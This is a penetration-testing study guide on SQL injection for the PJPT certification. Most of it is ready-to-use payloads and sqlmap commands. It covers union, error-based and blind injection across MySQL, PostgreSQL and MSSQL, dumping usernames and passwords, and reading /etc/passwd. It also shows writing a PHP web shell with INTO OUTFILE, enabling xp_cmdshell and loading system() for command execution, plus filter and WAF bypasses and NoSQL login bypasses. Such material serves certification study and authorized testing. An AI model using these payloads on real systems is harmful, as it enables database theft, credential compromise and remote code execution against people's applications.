# SQL Injection Techniques

## Overview
SQL Injection is a code injection technique that exploits security vulnerabilities in an application's software by inserting malicious SQL statements into an entry field for execution. This guide covers all major SQL injection techniques for PJPT certification.

## What is SQL Injection?

### Definition
**SQL Injection** occurs when user-supplied input is inserted into a SQL query without proper sanitization, allowing attackers to manipulate the database query structure.

### Why SQL Injection Matters for PJPT
- **Critical vulnerability** in web applications
- **Direct database access** and data extraction
- **Privilege escalation** opportunities
- **Remote code execution** in some cases
- **Foundation for post-exploitation** activities

## Basic SQL Injection Concepts

### 1. SQL Injection Testing Methodology
```bash
# 1. Identify injection points
# 2. Determine database type
# 3. Check for injection vulnerability
# 4. Exploit based on injection type
# 5. Extract data systematically
```

### 2. Common Injection Points
```bash
# GET parameters
http://target.com/page.php?id=1

# POST parameters (forms)
username=admin&password=test

# HTTP Headers
User-Agent: Mozilla/5.0...
Cookie: sessionid=abc123

# JSON/XML data
{"id": 1, "name": "test"}
```

### 3. SQL Injection Detection
```sql
# Basic detection payloads
'
"
`
')
")
`)
' OR '1'='1
" OR "1"="1
' OR '1'='1' --
' OR '1'='1' #
' UNION SELECT NULL--
```

## Union-Based SQL Injection

### 1. Basic Union Injection
```sql
# Step 1: Determine number of columns
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--
...
(Continue until error to find column count)

# Step 2: Find injectable columns
' UNION SELECT 1,2,3--
' UNION SELECT 1,2,3,4--
(Match number of columns from step 1)

# Step 3: Extract database information
' UNION SELECT 1,database(),version()--
' UNION SELECT 1,user(),@@hostname--
```

### 2. MySQL Union Injection
```sql
# Database enumeration
' UNION SELECT 1,schema_name,3 FROM information_schema.schemata--

# Table enumeration
' UNION SELECT 1,table_name,3 FROM information_schema.tables WHERE table_schema='database_name'--

# Column enumeration
' UNION SELECT 1,column_name,3 FROM information_schema.columns WHERE table_name='users'--

# Data extraction
' UNION SELECT 1,username,password FROM users--
' UNION SELECT 1,CONCAT(username,':',password),3 FROM users--

# File reading (if FILE privilege)
' UNION SELECT 1,LOAD_FILE('/etc/passwd'),3--

# File writing (if FILE privilege)
' UNION SELECT 1,'<?php system($_GET["cmd"]); ?>',3 INTO OUTFILE '/var/www/html/shell.php'--
```

### 3. PostgreSQL Union Injection
```sql
# Database enumeration
' UNION SELECT 1,datname,3 FROM pg_database--

# Table enumeration
' UNION SELECT 1,tablename,3 FROM pg_tables WHERE schemaname='public'--

# Column enumeration
' UNION SELECT 1,column_name,3 FROM information_schema.columns WHERE table_name='users'--

# Data extraction
' UNION SELECT 1,username,password FROM users--

# Command execution (if superuser)
'; CREATE OR REPLACE FUNCTION system(cstring) RETURNS int AS '/lib/libc.so.6', 'system' LANGUAGE 'c' STRICT--
'; SELECT system('id')--
```

### 4. MSSQL Union Injection
```sql
# Database enumeration
' UNION SELECT 1,name,3 FROM sys.databases--

# Table enumeration
' UNION SELECT 1,name,3 FROM sys.tables--

# Column enumeration
' UNION SELECT 1,name,3 FROM sys.columns WHERE object_id=OBJECT_ID('users')--

# Data extraction
' UNION SELECT 1,username,password FROM users--

# Command execution (if xp_cmdshell enabled)
'; EXEC xp_cmdshell 'whoami'--

# Enable xp_cmdshell
'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE--
```

## Error-Based SQL Injection

### 1. MySQL Error-Based
```sql
# ExtractValue function
' AND (SELECT ExtractValue(1,CONCAT(0x7e,(SELECT database()),0x7e)))--
' AND (SELECT ExtractValue(1,CONCAT(0x7e,(SELECT user()),0x7e)))--
' AND (SELECT ExtractValue(1,CONCAT(0x7e,(SELECT version()),0x7e)))--

# UpdateXML function
' AND (SELECT UpdateXML(1,CONCAT(0x7e,(SELECT database()),0x7e),1))--

# Duplicate entry error
' AND (SELECT COUNT(*) FROM (SELECT 1 UNION SELECT 2 UNION SELECT 3)x GROUP BY CONCAT((SELECT database()),FLOOR(RAND(0)*2)))--

# Data extraction with error-based
' AND (SELECT ExtractValue(1,CONCAT(0x7e,(SELECT CONCAT(username,':',password) FROM users LIMIT 0,1),0x7e)))--
' AND (SELECT ExtractValue(1,CONCAT(0x7e,(SELECT CONCAT(username,':',password) FROM users LIMIT 1,1),0x7e)))--
```

### 2. MSSQL Error-Based
```sql
# Convert function error
' AND 1=CONVERT(int,(SELECT @@version))--
' AND 1=CONVERT(int,(SELECT db_name()))--
' AND 1=CONVERT(int,(SELECT user_name()))--

# Cast function error
' AND 1=CAST((SELECT @@version) AS int)--

# Data extraction
' AND 1=CONVERT(int,(SELECT TOP 1 username FROM users))--
' AND 1=CONVERT(int,(SELECT TOP 1 username FROM users WHERE username NOT IN ('admin')))--
```

### 3. PostgreSQL Error-Based
```sql
# Cast error
' AND 1=CAST((SELECT version()) AS int)--
' AND 1=CAST((SELECT current_database()) AS int)--
' AND 1=CAST((SELECT current_user) AS int)--

# Data extraction
' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)--
' AND 1=CAST((SELECT password FROM users WHERE username='admin') AS int)--
```

## Blind SQL Injection

### 1. Boolean-Based Blind Injection
```sql
# Basic boolean testing
' AND 1=1--  (True condition)
' AND 1=2--  (False condition)

# Database detection
' AND (SELECT SUBSTRING(@@version,1,1))='5'--  (MySQL 5.x)
' AND (SELECT SUBSTRING(version(),1,10))='PostgreSQL'--  (PostgreSQL)

# String length detection
' AND (SELECT LENGTH(database()))=8--
' AND (SELECT LENGTH(user()))>5--

# Character-by-character extraction
' AND (SELECT SUBSTRING(database(),1,1))='t'--
' AND (SELECT SUBSTRING(database(),2,1))='e'--
' AND (SELECT SUBSTRING(database(),3,1))='s'--

# Table enumeration
' AND (SELECT COUNT(table_name) FROM information_schema.tables WHERE table_schema=database())=5--
' AND (SELECT SUBSTRING(table_name,1,1) FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1)='u'--

# Data extraction
' AND (SELECT SUBSTRING(username,1,1) FROM users LIMIT 0,1)='a'--
' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='p'--
```

### 2. Time-Based Blind Injection
```sql
# MySQL time-based
' AND IF((SELECT SUBSTRING(database(),1,1))='t',SLEEP(5),0)--
' AND IF((SELECT COUNT(*) FROM users)>0,SLEEP(5),0)--

# PostgreSQL time-based
'; SELECT CASE WHEN (SELECT current_database())='test' THEN pg_sleep(5) ELSE pg_sleep(0) END--

# MSSQL time-based
'; IF ((SELECT SUBSTRING(db_name(),1,1))='m') WAITFOR DELAY '00:00:05'--

# Data extraction with time delays
' AND IF((SELECT SUBSTRING(username,1,1) FROM users LIMIT 0,1)='a',SLEEP(5),0)--
' AND IF((SELECT LENGTH(username) FROM users LIMIT 0,1)=5,SLEEP(5),0)--
```

## Advanced SQL Injection Techniques

### 1. Second-Order SQL Injection
```sql
# Payload stored in first request
Username: admin'--
Password: anything

# Executed in second request when data is retrieved
# Example: Profile page showing "Welcome admin'--"
# If used in query: SELECT * FROM logs WHERE username='admin'--'
```

### 2. NoSQL Injection (MongoDB)
```javascript
// Authentication bypass
{"username": {"$ne": null}, "password": {"$ne": null}}
{"username": {"$regex": ".*"}, "password": {"$regex": ".*"}}

// Data extraction
{"username": {"$regex": "^a.*"}, "password": {"$ne": null}}
{"username": {"$regex": "^ad.*"}, "password": {"$ne": null}}

// JavaScript injection
{"username": "admin", "password": {"$where": "this.password.match(/^a.*/)"}
```

### 3. WAF Bypass Techniques
```sql
# Comment variations
/*comment*/
/*!comment*/
#comment
--comment

# Case variations
SeLeCt
UNION
union

# Encoding
%20 (space)
%27 (')
%22 (")
%2B (+)

# Whitespace alternatives
SELECT/**/username/**/FROM/**/users
SELECT+username+FROM+users
SELECT	username	FROM	users

# Alternative operators
' OR 1=1--
' || 1=1--
' OR 'a'='a'--

# Function alternatives
SUBSTRING() vs MID() vs LEFT()
CONCAT() vs ||
ASCII() vs ORD()
```

## Automated SQL Injection Tools

### 1. SQLMap
```bash
# Basic usage
sqlmap -u "http://target.com/page.php?id=1"

# POST data injection
sqlmap -u "http://target.com/login.php" --data="username=test&password=test"

# Cookie injection
sqlmap -u "http://target.com/page.php" --cookie="sessionid=abc123"

# Database enumeration
sqlmap -u "http://target.com/page.php?id=1" --dbs
sqlmap -u "http://target.com/page.php?id=1" -D database_name --tables
sqlmap -u "http://target.com/page.php?id=1" -D database_name -T users --columns
sqlmap -u "http://target.com/page.php?id=1" -D database_name -T users -C username,password --dump

# OS shell
sqlmap -u "http://target.com/page.php?id=1" --os-shell

# File operations
sqlmap -u "http://target.com/page.php?id=1" --file-read="/etc/passwd"
sqlmap -u "http://target.com/page.php?id=1" --file-write="shell.php" --file-dest="/var/www/html/shell.php"

# WAF bypass
sqlmap -u "http://target.com/page.php?id=1" --tamper=space2comment,charencode
```

### 2. Other Tools
```bash
# NoSQLMap
python nosqlmap.py -u "http://target.com/login" -v

# jSQL Injection
# GUI-based tool for SQL injection

# Burp Suite Extensions
# SQLiPy, SQLMapper, etc.
```

## SQL Injection Prevention Bypass

### 1. Filter Bypass Techniques
```sql
# Keyword filtering bypass
SeLeCt instead of SELECT
UNION ALL SELECT instead of UNION SELECT
/*!50000UNION*/ /*!50000SELECT*/

# Quote filtering bypass
CHAR(97,100,109,105,110) instead of 'admin'
0x61646d696e instead of 'admin' (hex)
CONCAT(CHAR(97),CHAR(100),CHAR(109),CHAR(105),CHAR(110))

# Space filtering bypass
SELECT/**/username/**/FROM/**/users
SELECT+username+FROM+users
SELECT%0Ausername%0AFROM%0Ausers

# Length restrictions
' UNION SELECT 1,2,3#
' UNION/**/SELECT/**/1,2,3#
```

### 2. Magic Hashes
```sql
# PHP type juggling with SQL
240610708 (hash starts with 0e)
314282422 (hash starts with 0e)

# Usage in authentication bypass
username: admin
password: 240610708

# If MD5 compared: '0e462097431906509019562988736854' == 0 (True)
```

## Database-Specific Payloads

### 1. MySQL Specific
```sql
# Version detection
SELECT @@version
SELECT version()

# Current user
SELECT user()
SELECT current_user()

# Database name
SELECT database()
SELECT schema()

# File operations
SELECT LOAD_FILE('/etc/passwd')
SELECT 'shell' INTO OUTFILE '/var/www/shell.php'

# Command execution via UDF
CREATE FUNCTION sys_exec RETURNS STRING SONAME 'udf_sys.so'
SELECT sys_exec('id')
```

### 2. PostgreSQL Specific
```sql
# Version detection
SELECT version()

# Current user
SELECT current_user
SELECT user

# Database name
SELECT current_database()

# File operations
COPY (SELECT 'data') TO '/tmp/output.txt'

# Command execution
CREATE OR REPLACE FUNCTION system(cstring) RETURNS int AS '/lib/libc.so.6', 'system' LANGUAGE 'C' STRICT
SELECT system('id')
```

### 3. MSSQL Specific
```sql
# Version detection
SELECT @@version

# Current user
SELECT user_name()
SELECT suser_sname()

# Database name
SELECT db_name()

# Command execution
EXEC xp_cmdshell 'whoami'

# Enable command execution
EXEC sp_configure 'show advanced options', 1
RECONFIGURE
EXEC sp_configure 'xp_cmdshell', 1
RECONFIGURE
```

## Practical SQL Injection Scenarios

### Scenario 1: Login Bypass
```sql
# Original query
SELECT * FROM users WHERE username='$user' AND password='$pass'

# Injection payload
Username: admin'--
Password: anything

# Resulting query
SELECT * FROM users WHERE username='admin'--' AND password='anything'
```

### Scenario 2: Data Extraction
```sql
# Original query
SELECT name FROM products WHERE id='$id'

# Union injection
?id=1' UNION SELECT username FROM users--

# Resulting query
SELECT name FROM products WHERE id='1' UNION SELECT username FROM users--'
```

### Scenario 3: File Upload via SQL
```sql
# MySQL file write
?id=1' UNION SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/cmd.php'--

# Accessing shell
http://target.com/cmd.php?cmd=whoami
```

## PJPT Exam Tips

### Essential Payloads to Memorize
```sql
# Detection
'
' OR '1'='1
' UNION SELECT NULL--

# Union injection
' UNION SELECT 1,database(),version()--
' UNION SELECT username,password FROM users--

# Error-based
' AND (SELECT ExtractValue(1,CONCAT(0x7e,(SELECT database()),0x7e)))--

# Boolean blind
' AND (SELECT SUBSTRING(database(),1,1))='t'--

# Time-based blind
' AND IF((SELECT database())='test',SLEEP(5),0)--
```

### SQLMap Essential Commands
```bash
# Basic enumeration
sqlmap -u "URL" --dbs
sqlmap -u "URL" -D database --tables
sqlmap -u "URL" -D database -T table --dump

# OS interaction
sqlmap -u "URL" --os-shell
sqlmap -u "URL" --file-read="/etc/passwd"
```

### Documentation Requirements
1. **Injection point identification**
2. **Payload used** and query reconstruction
3. **Database type** and version
4. **Data extracted** with proof
5. **File access/upload** if achieved
6. **Command execution** if possible

### Common Exam Scenarios
- **Login form** SQL injection
- **Search functionality** injection
- **URL parameter** injection
- **Cookie-based** injection
- **Blind injection** requiring boolean/time-based techniques

---

**Note**: Always ensure proper authorization before testing SQL injection. These techniques should only be used in authorized penetration testing scenarios or controlled lab environments. SQL injection can cause data loss or corruption if not performed carefully. 